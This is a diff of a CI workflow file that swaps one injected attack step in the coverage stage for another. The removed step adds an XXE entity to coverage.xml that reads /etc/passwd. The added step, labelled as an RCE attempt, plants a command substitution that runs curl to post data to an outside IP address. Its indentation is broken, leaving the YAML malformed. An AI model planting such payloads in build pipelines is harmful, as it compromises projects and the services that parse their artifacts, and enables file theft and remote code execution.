@@ -25,12 +25,12 @@ jobs:
           coverage run -m unittest discover tests
           coverage xml
 
-      - name: Modify coverage.xml (Potential Exploit)
-        run: |
-          echo 'Injecting malicious XML payload...'
-          sed -i 's|<source>.*</source>|<source>&xxe;</source>|' coverage.xml
-          echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' | cat - coverage.xml > temp.xml && mv temp.xml coverage.xml
-          cat coverage.xml  # Print modified file for debugging
+      - name: Modify coverage.xml (Attempt RCE)
+  run: |
+    echo 'Injecting command execution payload...'
+    sed -i 's|<source>.*</source>|<source><![CDATA[$(curl -X POST -d "hacked" http://172.232.109.35)]]></source>|' coverage.xml
+    cat coverage.xml  # Print modified file for debugging
+
 
       - name: Upload coverage to Coveralls
         env:
